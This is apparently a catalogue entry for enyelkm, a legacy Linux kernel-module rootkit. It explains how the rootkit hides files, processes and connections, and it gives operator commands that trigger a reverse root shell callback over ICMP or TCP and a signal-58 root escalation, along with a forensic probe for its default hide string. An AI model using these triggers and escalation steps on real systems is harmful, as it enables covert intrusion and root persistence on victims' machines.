---
name: "enyelkm"
categories:
  - blackarch-backdoor
version: "1.2"
homepage: "http://www.enye-sec.org/programas.html"
packaged-by: [blackarch]
blackarch-builddate: "2016-12-31"
build-system: scripts
license: GPL
meta-checked: "2026-11-09"
github-repo: "therealdreg/enyelkm"
github-stars: 87
github-pushed: "2023-08-11"
github-archived: false
github-issues: 0
github-match: "search"
gh-checked: "2026-11-07"
worth: 2.9
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# enyelkm

> LKM rootkit for 32-bit Linux 2.6 kernels: hides files, processes and connections by hooking the syscall entry points, and adds an ICMP/TCP-triggered reverse shell plus a magic-signal root escalation.

*No corpus evidence — derived from upstream documentation.*

## What it's for

Legacy persistence. EnyeLKM is a loadable kernel module installed after a compromise: it patches `system_call`/`sysenter_entry` so anything whose name contains the compile-time SHIDE string (default `OCULTAR`) vanishes from directory listings, processes carrying a magic GID (default `0x489196ab`) vanish from `ps`, chosen connections vanish from `netstat`, and the module itself is hidden from `lsmod`. For the operator it grants root to any shell sending signal 58 to a fake PID, and it calls back with a hidden root shell when triggered by an ICMP echo or TCP connection carrying a pre-shared key (`ENYELKMICMPKEY` / `ENYELKMTCPKEY` by default, set in `config.h`). It targets 2.6-era x86 kernels, so on modern systems it matters mainly as a detection and forensics training subject: the hide string, magic GID and default TCP 8822 callback are all probeable artifacts.

## Typical use cases

### Trigger the reverse shell with an ICMP knock

```
./connectar -icmp 198.51.100.10
```

Outcome: sends a crafted ICMP echo request carrying the pre-shared key; the rooted target calls back to your machine and hands over a root shell that is hidden from its own netstat and ps. Run it as root — the client needs raw sockets. Without a callback-port argument the shell lands on TCP 8822.

### Trigger over TCP instead

```
./connectar -tcp 198.51.100.10 443 1234
```

Outcome: completes a normal TCP handshake against the target port, then sends the key in a PSH packet; the target calls back to your local port 1234. The target port must be genuinely open — triggering a closed port does not work, and NAT between the two hosts breaks the callback.

### Escalate a shell to root on a loaded host

```
kill -s 58 12345
```

Outcome: the trapped kill syscall silently rewrites the calling shell's UID to 0 — there is no output, so confirm with an action only root can perform. The signal number and fake PID are defaults and can be changed in `kill.c` at build time.

### Probe a suspect system for the default configuration

```
touch /tmp/OCULTAR-probe; ls /tmp | grep -c OCULTAR
```

Outcome: prints `0` when the freshly created file is hidden from the listing — the hide-string filter is active and EnyeLKM (or a sibling rootkit using the same default SHIDE string) is likely installed. A visible file proves nothing, since defaults are often changed, and per upstream guidance you should never poke at hidden paths on a live suspect host — work from a forensic image.
